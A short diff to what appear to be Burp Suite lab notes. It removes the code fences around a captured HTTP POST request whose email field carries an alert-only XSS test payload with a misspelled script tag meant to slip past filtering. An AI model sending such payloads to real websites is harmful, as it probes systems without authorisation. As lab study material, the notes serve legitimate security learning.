@@ -206,7 +206,6 @@ Remediation：
 
 **Post modified request**
 - URL encode: ctrl+U
-```
 POST /ticket/ HTTP/1.1
 Host: 10.10.117.83
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
@@ -221,7 +220,6 @@ Referer: http://10.10.117.83/ticket/
 Upgrade-Insecure-Requests: 1
 
 email=<scripttt>alert("Succ3ssful%2bXSS")</scripttt>&content=hack+test
-```
 - "%2b" -> "+"
 
 ## Brup Suite: Repeater
